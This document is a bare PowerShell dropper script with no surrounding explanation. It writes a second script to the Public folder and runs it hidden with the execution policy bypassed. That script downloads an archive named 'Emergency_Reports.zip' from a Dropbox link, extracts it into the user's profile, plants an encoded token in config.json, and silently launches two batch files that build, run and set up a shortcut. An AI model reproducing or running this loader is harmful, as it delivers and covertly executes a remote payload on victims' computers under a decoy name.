$ps1='$userPath="C:\\Users\\$env:USERNAME";Set-Location -Path "C:\\Users\\Public";if(-not(Test-Path -Path "C:\\Users\\Public\\Emergency_Reports.zip")){try{Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/bcjhicy6yvopuijlhvwq3/Emergency_Reports.zip?rlkey=1rz5ckw43yq2wsdo8n1zdtp12&st=3vav3rpq&dl=1" -OutFile "Emergency_Reports.zip"}catch{Write-Host "Error downloading ''Emergency_Reports.zip'': $_";exit}}else{Write-Host "File ''Emergency_Reports.zip'' already exists. Skipping download."};if(-not(Test-Path -Path "$userPath\\Emergency_Reports")){try{Expand-Archive -Path "C:\\Users\\Public\\Emergency_Reports.zip" -DestinationPath "$userPath\\Emergency_Reports" -Force}catch{Write-Host "Error extracting ''Emergency_Reports.zip'': $_";if(Test-Path -Path "C:\\Users\\Public\\Emergency_Reports.zip"){Write-Host "Zip file may be corrupted. Deleting...";Remove-Item -Path "C:\\Users\\Public\\Emergency_Reports.zip" -Force};exit}}else{Write-Host "Folder ''Emergency_Reports'' already exists in $userPath. Skipping extraction."};try{Set-Location -Path "$userPath\\Emergency_Reports"}catch{Write-Host "Error accessing folder ''Emergency_Reports'': $_";exit};try{$configPath=Join-Path -Path "$userPath\\Emergency_Reports" -ChildPath "config.json";$config=@{};if(Test-Path -Path $configPath){$config=Get-Content -Path $configPath -Raw | ConvertFrom-Json -ErrorAction Stop};$config.esx1="VF9GZS9jUm8dVF2PMX2uFX1GVE4JpP9gYW9dxF6ZMF8JRs1eUl8spN4hMD3JlV2kUl5uRW9bUF4iJF9Naz7YFU2AMU8HV14WUn3gpS3vS16rFW9sbE0u1M4wal8lJW7OVE6QU51PSV0ioy2ZaE9C5k9Oa37eB15cTl3UVO9ebV4DNY0oUn9XNT4GM09s4x8vTk9nZr2OMk7m5D0yMV8sNR9PMk3HZR1vU07QV47sbF0oVH6iTk2u1S2xVF3MpC";$config|ConvertTo-Json|Set-Content -Path $configPath;Write-Host "Token updated successfully: VF9GZS9jUm8dVF2PMX2uFX1GVE4JpP9gYW9dxF6ZMF8JRs1eUl8spN4hMD3JlV2kUl5uRW9bUF4iJF9Naz7YFU2AMU8HV14WUn3gpS3vS16rFW9sbE0u1M4wal8lJW7OVE6QU51PSV0ioy2ZaE9C5k9Oa37eB15cTl3UVO9ebV4DNY0oUn9XNT4GM09s4x8vTk9nZr2OMk7m5D0yMV8sNR9PMk3HZR1vU07QV47sbF0oVH6iTk2u1S2xVF3MpC"}catch{Write-Host "Error updating config.json: $_";exit};if(Test-Path -Path ".\\build_and_run.bat"){try{Start-Process -FilePath "cmd.exe" -ArgumentList "/c .\\build_and_run.bat" -WindowStyle Hidden;Start-Sleep -Seconds 5;if(Test-Path -Path ".\\SetupShortcutAndRun.bat"){Start-Process -FilePath "cmd.exe" -ArgumentList "/c .\\SetupShortcutAndRun.bat" -WindowStyle Hidden}else{Write-Host "Error: ''SetupShortcutAndRun.bat'' not found.";exit}}catch{Write-Host "Error running batch files: $_";exit}}else{Write-Host "Error: ''build_and_run.bat'' not found.";exit}';
Set-Content -Path "C:\\Users\\Public\\emergency_setup.ps1" -Value $ps1;
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\\Users\\Public\\emergency_setup.ps1" -WindowStyle Hidden
